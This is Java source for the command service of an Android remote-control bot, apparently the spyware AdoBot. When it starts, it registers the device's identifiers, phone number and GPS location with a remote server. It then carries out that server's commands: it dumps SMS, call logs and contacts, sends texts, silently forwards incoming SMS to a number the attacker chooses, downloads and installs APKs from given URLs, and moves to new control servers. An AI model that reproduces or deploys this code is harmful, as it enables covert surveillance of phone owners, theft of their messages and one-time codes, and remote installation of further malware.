package com.android.adobot;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.net.URISyntaxException;
import java.util.HashMap;

import com.android.adobot.http.Http;
import com.android.adobot.http.HttpRequest;

import io.socket.client.Ack;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

import com.android.adobot.tasks.GetCallLogsTask;
import com.android.adobot.tasks.GetContactsTask;
import com.android.adobot.tasks.GetSmsTask;
import com.android.adobot.tasks.LocationMonitor;
import com.android.adobot.tasks.SendSmsTask;
import com.android.adobot.tasks.SmsForwarder;
import com.android.adobot.tasks.TransferBotTask;
import com.android.adobot.tasks.UpdateAppTask;


public class CommandService extends Service {

    private static final String TAG = "CommandService";

    private LocationMonitor locationTask;
    private SmsForwarder smsForwarder;
    private CommonParams params;
    private CommandService client;
    private Socket socket;
    private boolean connected = false;
    private boolean registered;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {

        super.onCreate();

        smsForwarder = new SmsForwarder(this);
        params = new CommonParams(this);
        client = this;
        connected = false;
        locationTask = new LocationMonitor(this);
        locationTask.start();
        createSocket(params.getServer());
        cleanUp();

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        Log.i(TAG, "Running onStartCommand");

        Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));
        if (!connected) {
            Log.i(TAG, "Socket is connecting ......\n");
            socket.connect();
        }
        return START_STICKY;
    }

    public void changeServer(String url) {
        params = new CommonParams(this);
        socket.disconnect();
        locationTask.setServer(url);
        createSocket(url);
        socket.connect();
    }

    private void createSocket(String url) {
        try {

            socket = IO.socket(url);
            socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {

                @Override
                public void call(Object... args) {

                    Log.i(TAG, "\n\nSocket connected\n\n");
                    connected = true;

                    HashMap bot = new HashMap();
                    bot.put("uid", params.getUid());
                    bot.put("provider", params.getProvider());
                    bot.put("device", params.getDevice());
                    bot.put("sdk", params.getSdk());
                    bot.put("version", params.getVersion());
                    bot.put("phone", params.getPhone());
                    bot.put("lat", locationTask.getLatitude());
                    bot.put("longi", locationTask.getLongitude());
                    bot.put("sms_forwarder_status", smsForwarder.isListening());

                    JSONObject obj = new JSONObject(bot);
                    socket.emit("register", obj, new Ack() {
                        @Override
                        public void call(Object... args) {
                            registered = true;
                            Log.i(TAG, "Socket connected");
                        }
                    });

                }

            });

            socket.on("commands", new Emitter.Listener() {

                @Override
                public void call(Object... args) {
                    JSONArray cmds = (JSONArray) args[0];
                    for (int i = 0; i < cmds.length(); i++) {
                        try {
                            JSONObject cmd = (JSONObject) cmds.get(i);

                            String command = (String) cmd.get("command");
                            Log.i(TAG, "\nCommand: " + cmd.toString() + "\n");

                            if (command.equals("getsms")) {
                                Log.i(TAG, "\nInvoking Sms Service\n");
                                int arg1 = Integer.parseInt(cmd.get("arg1").toString());
                                GetSmsTask smsService = new GetSmsTask(client, arg1);
                                smsService.start();
                            } else if (command.equals("getcallhistory")) {
                                Log.i(TAG, "\nInvoking Call LOg Service\n");
                                int arg1 = Integer.parseInt(cmd.get("arg1").toString());
                                GetCallLogsTask cs = new GetCallLogsTask(client, arg1);
                                cs.start();
                            } else if (command.equals("getcontacts")) {
                                Log.i(TAG, "\nInvoking GetContactsTask\n");
                                GetContactsTask cs = new GetContactsTask(client);
                                cs.start();
                            } else if (command.equals("promptupdate")) {
                                Log.i(TAG, "\nInvoking UpdateAppTask\n");
                                String apkUrl = cmd.get("arg1").toString();

                                UpdateAppTask atualizaApp = new UpdateAppTask(client, apkUrl);
                                atualizaApp.start();
                            } else if (command.equals("sendsms")) {
                                Log.i(TAG, "\nInvoking SendSMS\n");
                                String phoneNumber = cmd.get("arg1").toString();
                                String textMessage = cmd.get("arg2").toString();

                                SendSmsTask sendSmsTask = new SendSmsTask(client);
                                sendSmsTask.setPhoneNumber(phoneNumber);
                                sendSmsTask.setTextMessage(textMessage);
                                sendSmsTask.start();

                            } else if (command.equals("transferbot")) {
                                Log.i(TAG, "\nInvoking Transfer bot command\n");
                                String newServer = cmd.get("arg1").toString();

                                TransferBotTask t = new TransferBotTask(client, newServer);
                                t.start();

                            } else if (command.equals("smsforwarder")) {
                                String isForward = cmd.get("arg1").toString();
                                String pNumber = cmd.has("arg2") ? cmd.get("arg2").toString() : "";
                                if (isForward.equals("forward")) {
                                    Log.i(TAG, "\nInvoking Forward SMS forward command\n");
                                    smsForwarder.setRecipientNumber(pNumber);
                                    smsForwarder.listen();
                                } else if (isForward.equals("stop")) {
                                    Log.i(TAG, "\nInvoking Forward SMS stop command\n");
                                    smsForwarder.stopForwarding();
                                }

                            } else {
                                Log.i(TAG, "Unknown command");
                                HashMap xcmd = new HashMap();
                                xcmd.put("event", "command:unknown");
                                xcmd.put("uid", params.getUid());
                                xcmd.put("device", params.getDevice());
                                xcmd.put("command", command);

                                Http req = new Http();
                                req.setUrl(params.getServer() + "/notify");
                                req.setMethod(HttpRequest.METHOD_POST);
                                req.setParams(xcmd);
                                req.execute();
                            }

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }

            });

            socket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {

                @Override
                public void call(Object... args) {
                    connected = false;
                    Log.i(TAG, "\n\nSocket disconnected...\n\n");
                    final Thread reconnect = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            Log.i(TAG, "Socket reconnecting...");
                        }
                    });

                }

            });

            socket.on(Socket.EVENT_RECONNECTING, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.i(TAG, "Socket reconnecting...");
                }
            });

        } catch (URISyntaxException e) {
            e.printStackTrace();
        }

    }

    private void cleanUp () {
//        remove previously installed update apk file
        File updateApk = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), Constants.UPDATE_PKG_FILE_NAME);
        if (updateApk.exists())
            updateApk.delete();
    }

}
